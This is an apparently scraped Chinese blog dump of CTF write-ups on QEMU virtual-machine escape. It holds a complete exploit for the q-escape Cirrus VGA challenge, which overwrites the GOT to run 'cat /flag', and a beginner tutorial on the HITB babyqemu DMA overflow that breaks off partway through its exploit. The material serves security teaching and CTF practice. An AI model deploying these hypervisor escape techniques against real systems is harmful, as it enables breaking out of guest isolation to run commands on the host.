opaque-&gt;vga.ar_flip_flop = ar_flip_flop ^ 1;  break;  case 0x12uLL:  opaque-&gt;vga.msr = value &amp; 0xEF;  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);  break;  case 0x14uLL:  opaque-&gt;vga.sr_index = value;  break;  ... ...&#125;\n\n着狗屎ida翻译的是0x14\n.text:000000000068F5F6 48 81 EB B4 03 00 00          sub     addr, 3B4h                      ; switch 39 cases.text:000000000068F5FD 48 83 FB 26                   cmp     rbx, 26h.text:000000000068F601 77 C1                         ja      short def_68F603                ; jumptable 000000000068F603 default case, cases 950-953,955-959,961,963,970-973,976-979,982-985.text:000000000068F601                                                                       ; jumptable 000000000068F792 default case, cases 5,32-47,50-79,82-111,114-143,146-175,178-203,207,210-239.text:000000000068F601.text:000000000068F603 FF 24 DD 78 8E A9 00          jmp     ds:jpt_68F603[rbx*8]            ; switch jump\n\n 在这里是减去0x3B4\n\n但是这里真正需要的是0x10，又一次翻译错误。\n忽略这些小错误之后直接编写exp即可\n综上，可得exp#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;uint32_t vga_addr = 0xa0000;uint32_t vga_size = 0x20000;unsigned char *mmio_mem;unsigned char *vga_mem;void set_sr(unsigned int idx, unsigned int val)&#123;    outb(idx, 0x3c4);    outb(val, 0x3c5);&#125;void vga_mem_write(uint32_t addr, uint8_t value)&#123;    *((uint8_t *)(vga_mem + addr)) = value;&#125;void set_latch(uint32_t value)&#123;    char a;    a = vga_mem[(value &gt;&gt; 16) &amp; 0xffff]; // write hight    write(1, &amp;a, 1);    a = vga_mem[value &amp; 0xffff]; // write low    write(1, &amp;a, 1);&#125;int main()&#123;    system(&quot;mknod -m 660 /dev/mem c 1 1&quot;);    int fd = open(&quot;/dev/mem&quot;, O_RDWR | O_SYNC);    if (fd == -1)    &#123;        return 0;    &#125;    vga_mem = mmap(NULL, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);    if (!vga_mem)    &#123;        die(&quot;mmap vga mem failed&quot;);    &#125;    if (ioperm(0x3b0, 0x30, 1) == -1)    &#123;        die(&quot;cannot ioperm&quot;);    &#125;    set_sr(7, 1);       // bypass first if    set_sr(0xcc, 4);    // v7==4    set_sr(0xcd, 0x10); // vs[0x10]    unsigned long long int bss = 0x109e000 + 0x500;    unsigned long long int qemu_logfile = 0x10CCBE0;    unsigned long long int vfprintf_got = 0xee7bb0;    unsigned long long int system_plt = 0x409dd0;    unsigned long long int printf_chk_got = 0xee7028;    unsigned long long int qemu_log = 0x9726E8;    char cat_flag[] = &quot;cat /flag&quot;;    char a;    char *payload;    int cur_size = 0;    a = vga_mem[1];    write(1, &amp;a, 1);    set_latch(bss);    for (int i = 0; i &lt; 9; i++)    &#123;        write(1, &amp;cat_flag[i], 1);        vga_mem_write(0x18100, cat_flag[i]);    &#125;    cur_size += 9;    set_latch(qemu_logfile - cur_size);    payload = (char *)&amp;bss;    for (int i = 0; i &lt; 8; i++)    &#123;        write(1, &amp;payload[i], 1);        vga_mem_write(0x18100, payload[i]);    &#125;    cur_size += 8;    set_latch(vfprintf_got - cur_size);    payload = (char *)&amp;system_plt;    for (int i = 0; i &lt; 8; i++)    &#123;        write(1, &amp;payload[i], 1);        vga_mem_write(0x18100, payload[i]);    &#125;    cur_size += 8;    set_latch(printf_chk_got - cur_size);    payload = (char *)&amp;qemu_log;    for (int i = 0; i &lt; 8; i++)    &#123;        write(1, &amp;payload[i], 1);        vga_mem_write(0x18100, payload[i]);    &#125;    cur_size += 8;    set_sr(0xcc, 2);    vga_mem_write(0x18100, 1);    return 0;&#125;\n\n\n\n参考链接:  https://www.anquanke.com/post/id/224199#h3-11  https://devcraft.io/2018/11/22/q-escape-seccon-2018.html  https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004  https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h题目链接:  https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip\n","categories":["qemu escape"],"tags":["mmio","pmio","vga"]},{"title":"qemu逃逸入门","url":"/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/","content":"首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。\n在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调试完整的计算机系统。而qemu逃逸的题目指的就是System mode这种模式，题目的形式主要是给出存在漏洞的设备然后加以利用。\nqemu的内存结构qemu使用mmap为虚拟机申请出相应大小的内存，当做虚拟机的物理内存，且这部分内存没有执行权限。\nqemu的地址转化用户虚拟地址-&gt;用户物理地址\n用户物理地址-&gt;qemu的虚拟地址空间：这里是将用户的物理地址转化为qemu使用mmap申请出来的地址空间，而这部分空间的内容与用户的物理地址一一对应。\n在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，/proc/$pid/pagemap 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值，包含以下的数据。\n\n  Bits 0-54 page frame number (PFN) if present\n  Bits 0-4 swap type if swapped\n  Bits 5-54 swap offset if swapped\n  Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)\n  Bit 56 page exclusively mapped (since 4.2)\n  Bits 57-60 zero\n  Bit 61 page is file-page or shared-anon (since 3.5)\n  Bit 62 page swapped\n  Bit 63 page present\n\n根据以上信息，利用/proc/pid/pagemap可将虚拟地址转换为物理地址，具体步骤如下：\n1、 计算虚拟地址所在虚拟页对应的数据项在/proc/pid/pagemap中的偏移，offset=(viraddr/pagesize)*sizeof(uint64_t)\n2、 读取长度为64bits的数据项\n3、 根据Bit 63 判断物理内存页是否存在\n4、 若物理内存页已存在，则取bits 0-54作为物理页号\n5、 计算出物理页起始地址加上页内偏移即得到物理地址，phtaddr = pageframenum * pagesize + viraddr % pagesize\n对应代码如下：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;   #include &lt;stdint.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;int main()&#123;    char *userbuf;    uint64_t userbuf_pa;    unsigned char* mmio_mem;    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)&#123;        perror(&quot;open mmio&quot;);        exit(-1);    &#125;    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)&#123;        perror(&quot;mmap mmio&quot;);        exit(-1);    &#125;    printf(&quot;mmio_mem:\\t%p\\n&quot;, mmio_mem);    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (userbuf == MAP_FAILED)&#123;        perror(&quot;mmap userbuf&quot;);        exit(-1);    &#125;    strcpy(usebuf,&quot;test&quot;);    mlock(userbuf, 0x1000);    userbuf_pa = va2pa(userbuf);    printf(&quot;userbuf_va:\\t%p\\n&quot;,userbuf);    printf(&quot;userbuf_pa:\\t%p\\n&quot;,(void *)userbuf_pa);&#125;\n\nPCI设备符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。\nmmio而在设备中存在不同的地址映射模式。而mmio则是内存映射io，和内存共享一个地址空间。可以和像读写内存一样读写其内容。\n\n\n  Bit 0：Region Type，总是为 0，用于区分此类型为 Memory\n  Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB\n  Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取\n  Bits 31-4：Base Address，以 16 字节对齐基址\n\n\n在用户态下访问mmio空间代码示例：\n#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include&lt;sys/io.h&gt;unsigned char* mmio_mem;void die(const char* msg)&#123;    perror(msg);    exit(-1);&#125;void mmio_write(uint32_t addr, uint32_t value)&#123;    *((uint32_t*)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123;    return *((uint32_t*)(mmio_mem + addr));&#125;int main(int argc, char *argv[])&#123;    // Open and map I/O memory for the strng device    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    printf(&quot;mmio_mem @ %p\\n&quot;, mmio_mem);    mmio_read(0x128);    mmio_write(0x128, 1337);&#125;\n\n在内核态下访问mmio空间代码示例：\n#include &lt;asm/io.h&gt;#include &lt;linux/ioport.h&gt;long addr=ioremap(ioaddr,iomemsize);readb(addr);readw(addr);readl(addr);readq(addr);//qwords=8 btyeswriteb(val,addr);writew(val,addr);writel(val,addr);writeq(val,addr);iounmap(addr);\n\npmio端口映射io，内存和io设备有个字独立的地址空间，cpu需要通过专门的指令才能去访问。在intel的微处理器中使用的指令是IN和OUT。\n\n\n  Bit 0：Region Type，总是为 1，用于区分此类型为 I/O\n  Bit 1：Reserved\n  Bits 31-2：Base Address，以 4 字节对齐基址\n\n\n访问pmio代码示例：\n#include &lt;sys/io.h&gt;uint32_t pmio_base = 0xc050;uint32_t pmio_write(uint32_t addr, uint32_t value)&#123;    outl(value,addr);&#125;uint32_t pmio_read(uint32_t addr)&#123;    return (uint32_t)inl(addr);&#125;int main(int argc, char *argv[])&#123;    // Open and map I/O memory for the strng device    if (iopl(3) !=0 )        die(&quot;I/O permission is not enough&quot;);        pmio_write(pmio_base+0,0);    pmio_write(pmio_base+4,1);&#125;\n\nlspcipci外设地址，形如0000:00:1f.1。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分表示3位表示功能号。下面是lspci的输出，其中pci设备的地址，在最头部给出，由于pc设备总只有一个0号域，随意会省略域。\n\n在/sys/bus/pci/devices可以找到每个总线设备相关的一写文件。\n\n\n每个设备的目录下resource0 对应MMIO空间。resource1 对应PMIO空间。resource文件里面会记录相关的数据，第一行就是mimo的信息，从左到右是：起始地址、结束地址、标识位。\nHITB GSEC2017 babyqemu因为是第一次玩qemu逃逸，所以题目记录的比较详细，偏向新手向！\n分析程序首先注意的是加载文件\n./qemu-system-x86_64 \\-initrd ./rootfs.cpio \\-kernel ./vmlinuz-4.8.0-52-generic \\-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \\-enable-kvm \\-monitor /dev/null \\-m 64M --nographic  -L ./dependency/usr/local/share/qemu \\-L pc-bios \\-device hitb,id=vda\n\n这里需要注意的是 -device 选项，可以看到这里的设备为 hitb 这个pci设备。\n那么逆向的方法就是将qemu-system-x86_64拖入ida搜索hitb\n\n首先则是先观察init函数\nvoid __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)&#123;  ObjectClass_0 *v2; // rax  v2 = object_class_dynamic_cast_assert(         a1,         (const char *)&amp;stru_64A230.bulk_in_pending[2].data[72],         (const char *)&amp;stru_5AB2C8.msi_vectors,         469,         &quot;hitb_class_init&quot;);  BYTE4(v2[2].object_cast_cache[3]) = 16;  HIWORD(v2[2].object_cast_cache[3]) = 255;  v2[2].type = (Type)pci_hitb_realize;  v2[2].object_cast_cache[0] = (const char *)pci_hitb_uninit;  LOWORD(v2[2].object_cast_cache[3]) = 4660;  WORD1(v2[2].object_cast_cache[3]) = 9011;&#125;\n\n在init初始化函数，需要将设备类型定义为PCIDeviceClass结构体。PCIDeviceClass结构体在Local type中可以找到它的描述定义。\nstruct PCIDeviceClass&#123;  DeviceClass_0 parent_class;  void (*realize)(PCIDevice_0 *, Error_0 **);    //0xc0  int (*init)(PCIDevice_0 *);  PCIUnregisterFunc *exit;  PCIConfigReadFunc *config_read;  PCIConfigWriteFunc *config_write;  uint16_t vendor_id;    //0xe8  uint16_t device_id;    //0xea  uint8_t revision;  uint16_t class_id;  uint16_t subsystem_vendor_id;  uint16_t subsystem_id;  int is_bridge;  int is_express;  const char *romfile;&#125;;\n\n这里手动添加一下结构体再修改init函数中的变量定义\n00000000 PCIDeviceClass struc ; (sizeof=0x108, align=0x8, copyof_1371)00000000 parent_class DeviceClass_0 ?000000C0 realize dq ?                            ; offset000000C8 init dq ?                               ; offset000000D0 exit dq ?                               ; offset000000D8 config_read dq ?                        ; offset000000E0 config_write dq ?                       ; offset000000E8 vendor_id dw ?000000EA device_id dw ?000000EC revision db ?000000ED db ? ; undefined000000EE class_id dw ?000000F0 subsystem_vendor_id dw ?000000F2 subsystem_id dw ?000000F4 is_bridge dd ?000000F8 is_express dd ?000000FC db ? ; undefined000000FD db ? ; undefined000000FE db ? ; undefined000000FF db ? ; undefined00000100 romfile dq ?                            ; offset00000108 PCIDeviceClass ends00000108\n\nvoid __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)&#123;  PCIDeviceClass *v2; // rax  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(                           a1,                           (const char *)&amp;stru_64A230.bulk_in_pending[2].data[72],                           (const char *)&amp;stru_5AB2C8.msi_vectors,                           469,                           &quot;hitb_class_init&quot;);  v2-&gt;revision = 16;  v2-&gt;class_id = 255;  v2-&gt;realize = pci_hitb_realize;  v2-&gt;exit = pci_hitb_uninit;  v2-&gt;vendor_id = 4660;  v2-&gt;device_id = 0x2333;&#125;\n\n可以看到设备号device_id=0x2333，功能号vendor_id=0x1234\n# lspci -v00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:111100:01.0 Class 0601: 8086:700000:04.0 Class 00ff: 1234:2333# ls /sys/bus/pci/devices/0000\\:00\\:04.0/broken_parity_status      firmware_node             rescanclass                     irq                       resourceconfig                    local_cpulist             resource0consistent_dma_mask_bits  local_cpus                subsystemd3cold_allowed            modalias                  subsystem_devicedevice                    msi_bus                   subsystem_vendordma_mask_bits             numa_node                 ueventdriver_override           power                     vendorenable                    remove# cat /sys/bus/pci/devices/0000\\:00\\:04.0/resource0x00000000fea00000 0x00000000feafffff 0x00000000000402000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000\n\nresource文件内容的格式为start end flag 。在resource0文件中，根据这里没有resource1文件或者根据flag最后一位为0可知存在一个MMIO的内存空间，地址为0xfea00000，大小为0x100000。\n其次分析注册的函数，通过pci_hitb_realize函数查看\nvoid __fastcall pci_hitb_realize(HitbState *pdev, Error_0 **errp)&#123;  pdev-&gt;pdev.config[61] = 1;  if ( !msi_init(&amp;pdev-&gt;pdev, 0, 1u, 1, 0, errp) )  &#123;    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[1], 1000000, (QEMUTimerCB *)hitb_dma_timer, pdev);    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);    qemu_cond_init(&amp;pdev-&gt;thr_cond);    qemu_thread_create(&amp;pdev-&gt;thread, (const char *)&amp;stru_5AB2C8.not_legacy_32bit + 12, hitb_fact_thread, pdev, 0);    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, &quot;hitb-mmio&quot;, 0x100000uLL);    pci_register_bar(&amp;pdev-&gt;pdev, 0, 0, &amp;pdev-&gt;mmio);  &#125;&#125;\n\n首先可以看到在timer_init_tl函数是将hitb_dma_timer作为回调函数\nvoid __fastcall timer_init_tl(QEMUTimer_0 *ts, QEMUTimerList_0 *timer_list, int scale, QEMUTimerCB *cb, void *opaque)&#123;  ts-&gt;timer_list = timer_list;  ts-&gt;cb = cb;  ts-&gt;opaque = opaque;  ts-&gt;scale = scale;  ts-&gt;expire_time = -1LL;&#125;\n\n接着在下面注册了hitb_mmio_ops\n.data.rel.ro:00000000009690A0 40 44 28 00 00 00 00 00 A0 41+hitb_mmio_ops dq offset hitb_mmio_read                ; read.data.rel.ro:00000000009690A0 28 00 00 00 00 00 00 00 00 00+                                        ; DATA XREF: pci_hitb_realize+99↑o.data.rel.ro:00000000009690A0 00 00 00 00 00 00 00 00 00 00+dq offset hitb_mmio_write               ; write.data.rel.ro:00000000009690A0 00 00 00 00 00 00 00 00 00 00+dq 0\n\n所以这里需要重点注意的也就是这样三个函数：\nhitb_mmio_readhitb_mmio_writehitb_dma_timer\n\n分析函数在分析函数之前还需要搞懂设备结构体，具体可以在view-&gt;Open Subviews-&gt;Local Type(shift + F1)中搜索\nstruct __attribute__((aligned(16))) HitbState&#123;  PCIDevice_0 pdev;  MemoryRegion_0 mmio;  QemuThread_0 thread;  QemuMutex_0 thr_mutex;  QemuCond_0 thr_cond;  bool stopping;  uint32_t addr4;  uint32_t fact;  uint32_t status;  uint32_t irq_status;  dma_state dma;  QEMUTimer_0 dma_timer;  char dma_buf[4096];  void (*enc)(char *, unsigned int);  uint64_t dma_mask;&#125;;\n\nstruct dma_state&#123;  dma_addr_t src;  dma_addr_t dst;  dma_addr_t cnt;  dma_addr_t cmd;&#125;;\n\nuint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size)&#123;  uint64_t result; // rax  uint64_t val; // [rsp+0h] [rbp-20h]  result = -1LL;  if ( size == 4 )  &#123;    if ( addr == 128 )      return opaque-&gt;dma.src;    if ( addr &gt; 0x80 )    &#123;      if ( addr == 140 )        return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4);      if ( addr &lt;= 0x8C )      &#123;        if ( addr == 132 )          return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4);        if ( addr == 136 )          return opaque-&gt;dma.dst;      &#125;      else      &#123;        if ( addr == 144 )          return opaque-&gt;dma.cnt;        if ( addr == 152 )          return opaque-&gt;dma.cmd;      &#125;    &#125;    else    &#123;      if ( addr == 8 )      &#123;        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);        val = opaque-&gt;fact;        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);        return val;      &#125;      if ( addr &lt;= 8 )      &#123;        result = 0x10000EDLL;        if ( !addr )          return result;        if ( addr == 4 )          return opaque-&gt;addr4;      &#125;      else      &#123;        if ( addr == 32 )          return opaque-&gt;status;        if ( addr == 36 )          return opaque-&gt;irq_status;      &#125;    &#125;    return -1LL;  &#125;  return result;&#125;\n\n需要满足size == 4才能读取\nvoid __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  uint32_t v4; // r13d  int v5; // edx  bool v6; // zf  int64_t ns; // rax  if ( (addr &gt; 0x7F || size == 4) &amp;&amp; (((size - 4) &amp; 0xFFFFFFFB) == 0 || addr &lt;= 0x7F) )  &#123;    if ( addr == 128 )    &#123;      if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )        opaque-&gt;dma.src = val;    &#125;    else    &#123;      v4 = val;      if ( addr &gt; 0x80 )      &#123;        if ( addr == 140 )        &#123;          if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )            *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4) = val;        &#125;        else if ( addr &gt; 0x8C )        &#123;          if ( addr == 144 )          &#123;            if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )              opaque-&gt;dma.cnt = val;          &#125;          else if ( addr == 152 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )          &#123;            opaque-&gt;dma.cmd = val;            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);            timer_mod(&amp;opaque-&gt;dma_timer, ns / 1000000 + 100);          &#125;        &#125;        else if ( addr == 132 )        &#123;          if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )            *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4) = val;        &#125;        else if ( addr == 136 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )        &#123;          opaque-&gt;dma.dst = val;        &#125;      &#125;      else if ( addr == 32 )      &#123;        if ( (val &amp; 0x80) != 0 )          _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 0x80u);        else          _InterlockedAnd((volatile signed __int32 *)&amp;opaque-&gt;status, 0xFFFFFF7F);      &#125;      else if ( addr &gt; 0x20 )      &#123;        if ( addr == 96 )        &#123;          v6 = ((unsigned int)val | opaque-&gt;irq_status) == 0;          opaque-&gt;irq_status |= val;          if ( !v6 )            hitb_raise_irq(opaque, 0x60u);        &#125;        else if ( addr == 100 )        &#123;          v5 = ~(_DWORD)val;          v6 = (v5 &amp; opaque-&gt;irq_status) == 0;          opaque-&gt;irq_status &amp;= v5;          if ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )            pci_set_irq(&amp;opaque-&gt;pdev, 0);        &#125;      &#125;      else if ( addr == 4 )      &#123;        opaque-&gt;addr4 = ~(_DWORD)val;      &#125;      else if ( addr == 8 &amp;&amp; (opaque-&gt;status &amp; 1) == 0 )      &#123;        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);        opaque-&gt;fact = v4;        _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 1u);        qemu_cond_signal(&amp;opaque-&gt;thr_cond);        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);      &#125;    &#125;  &#125;&#125;\n\n同样需要满足size == 4，并且在部分操作还需要满足(opaque-&gt;dma.cmd &amp; 1) == 0\nvoid __fastcall hitb_dma_timer(HitbState *opaque)&#123;  dma_addr_t cmd; // rax  __int64 v2; // rdx  uint8_t *cnt_low; // rsi  dma_addr_t v4; // rax  dma_addr_t v5; // rdx  uint8_t *v6; // rbp  char *v7; // rbp  cmd = opaque-&gt;dma.cmd;  if ( (cmd &amp; 1) != 0 )  &#123;    if ( (cmd &amp; 2) != 0 )    &#123;      v2 = (unsigned int)(LODWORD(opaque-&gt;dma.src) - 0x40000);      if ( (cmd &amp; 4) != 0 )                     // 7      &#123;        v7 = &amp;opaque-&gt;dma_buf[v2];        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);        cnt_low = (uint8_t *)v7;      &#125;      else                                      // 3      &#123;        cnt_low = (uint8_t *)&amp;opaque-&gt;dma_buf[v2];      &#125;      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, 1);      v4 = opaque-&gt;dma.cmd;      v5 = v4 &amp; 4;    &#125;    else                                        // 1    &#123;      v6 = (uint8_t *)&amp;opaque[-36] + (unsigned int)opaque-&gt;dma.dst - 2824;      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - 0x40000 + 3000;      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0);      v4 = opaque-&gt;dma.cmd;      v5 = v4 &amp; 4;      if ( (v4 &amp; 4) != 0 )      &#123;        cnt_low = (uint8_t *)LODWORD(opaque-&gt;dma.cnt);        opaque-&gt;enc((char *)v6, (unsigned int)cnt_low);        v4 = opaque-&gt;dma.cmd;        v5 = v4 &amp; 4;      &#125;    &#125;    opaque-&gt;dma.cmd = v4 &amp; 0xFFFFFFFFFFFFFFFELL;    if ( v5 )    &#123;      opaque-&gt;irq_status |= 0x100u;      hitb_raise_irq(opaque, (uint32_t)cnt_low);    &#125;  &#125;&#125;\n\n这里就是回调函数了，在上面的hitb_mmio_write函数中，当满足if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )就会调用了。而在这个函数中存在这样一个函数cpu_physical_memory_rw，这个函数在我翻看手册的时候还发现了其他类似的函数cpu_physical_memory_read、cpu_physical_memory_write所以可以猜测得到这个函数到底是干什么的。这个函数就是用于传递内容在物理地址和虚拟地址之间。cpu_physical_memory_rw函数的第一个参数时物理地址，虚拟地址需要通过读取/proc/$pid/pagemap转换为物理地址。\n\n dma.cmd==7时，idx=dma.src-0x40000，addr = dma_buf[idx]，调用enc加密函数加密，并写入到dma.dst中\n dma.cmd==3时，idx=dma.src-0x40000，addr = dma_buf[idx]，写入到dma.dst中\n dma.cmd==1时，idx=dma.dst-0x40000,addr=dma_buf[idx]，将其写入到dma.src中（第二个参数可以通过调试得到其地址就是dma_buf[dma.dst-0x40000]\n\n这个程序的作用就显而易见，这里实现的是一个dma机制。DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。DMA 传输将数据从一个地址空间复制到另外一个地址空间。当CPU 初始化这个传输动作，传输动作本身是由 DMA 控制器来实行和完成。\n即首先通过访问mmio地址与值（addr与value），在hitb_mmio_write函数中设置好dma中的相关值（src、dst以及cmd)。当需要dma传输数据时，设置addr为152，就会触发时钟中断，由另一个线程去处理时钟中断。时钟中断调用hitb_dma_timer，该函数根据dma.cmd的不同调用cpu_physical_memory_rw函数将数据从物理地址拷贝到dma_buf中或从dma_buf拷贝到物理地址中。\n漏洞分析与利用接下来就是分析程序的漏洞了，这里的漏洞是非常明显的位于hitb_dma_timer函数中，其中的v2是没有做任何边界检查的，存在明显的溢出漏洞。\n并且在上述找到的结构体看到了，他的dma_buf的大小只有4096，并且下方紧接着就是enc。而我们都知道enc存放的是回调函数，所以这里的利用思路就是，通过溢出泄漏出enc中存放的函数地址，紧接着修改其中的函数为system@plt，最后在dma_buf中写入cat flag\\x00即可获取flag。\nexp\n#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        